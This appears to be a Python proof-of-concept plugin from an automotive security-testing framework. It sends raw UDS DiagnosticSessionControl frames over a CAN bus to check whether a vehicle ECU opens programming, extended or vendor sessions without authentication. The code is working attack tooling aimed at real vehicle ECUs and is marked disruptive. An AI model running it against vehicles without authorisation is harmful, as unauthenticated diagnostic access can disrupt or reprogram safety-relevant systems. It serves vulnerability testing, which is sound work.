#!/usr/bin/env python3
"""
PoC Name: UDS Diagnostic Session Bypass
Identifier: CWE-306
Component: UDS Protocol (ISO 14229)
Category: Protocol
Severity: High
CVSS: 7.5
Description: 尝试通过UDS 0x10服务直接进入扩展诊断会话,检测是否缺少访问控制。
Prerequisites: PCAN接口, python-can库, PCAN驱动。
Usage: python3 05_CWE_306_UDS_Diagnostic_Session_Bypass_Active_Validation.py PCAN_USBBUS1
"""
from __future__ import annotations

import sys
from iv_plugin_base import IVIVulnerabilityPlugin
from can_bus_utils import format_can_settings, get_can_settings, open_can_bus

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['SocketCAN 适配器（PEAK PCAN-USB / Kvaser Leaf Light / canable）', 'OBD-II 转 DB9 线缆'],
    "connection": 'SocketCAN (can0 / vcan0)',
    "tools":      ['python-can', 'cantools', 'socketcand'],
    "firmware":   'N/A（协议层攻击，不依赖特定固件版本）',
    "setup":      'ip link set can0 up type can bitrate 500000',
}

class UDSDiagSessionPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-CAN-005"
    meta_poc_name = 'CWE-306 UDS Diagnostic Session Bypass Active Validation'
    meta_cve_id = "CWE-306"
    meta_source_url = "https://cwe.mitre.org/data/definitions/306.html"
    meta_references = ['https://cwe.mitre.org/data/definitions/306.html']
    meta_severity = "High"
    meta_protocol = "can"
    meta_target_os = ["all"]
    meta_required_params = ["can_interface"]
    meta_profiles         = ["can_gateway"]
    requires_manual_review = True
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"检查CAN接口: {format_can_settings(settings)}")
        return True
    def exploit(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"UDS诊断会话测试 ({format_can_settings(settings)})...")
        try:
            import can
            bus = open_can_bus(self.params)
            sessions = [(0x02, "Programming"), (0x03, "ExtendedDiag"), (0x60, "Vendor")]
            for sub, name in sessions:
                msg = can.Message(arbitration_id=0x7E0,
                    data=[0x02, 0x10, sub, 0,0,0,0,0], is_extended_id=False)
                bus.send(msg)
                resp = bus.recv(timeout=1.0)
                if resp and len(resp.data) > 1:
                    if resp.data[1] == 0x50:
                        self.logger.warning(f"[+] {name}会话(0x{sub:02X})已开启！无需认证")
                        self.results["vulnerable"] = True
                        self.results["evidence"] = (
                            f"UDS DiagnosticSessionControl positive response 0x50 received for sub-function 0x{sub:02X} "
                            "without prior authentication"
                        )
                        bus.shutdown()
                        return self.results
                    elif resp.data[1] == 0x7F:
                        nrc = resp.data[3] if len(resp.data) > 3 else 0
                        self.logger.info(f"  {name}(0x{sub:02X}) 被拒绝 NRC=0x{nrc:02X}")
            bus.shutdown()
            self.logger.info("所有诊断会话均需要认证")
            self.results["vulnerable"] = False
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"UDS测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 05_CWE_306_UDS_Diagnostic_Session_Bypass_Active_Validation.py <can_interface>")
        sys.exit(1)
    plugin = UDSDiagSessionPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
    plugin.run_verify()
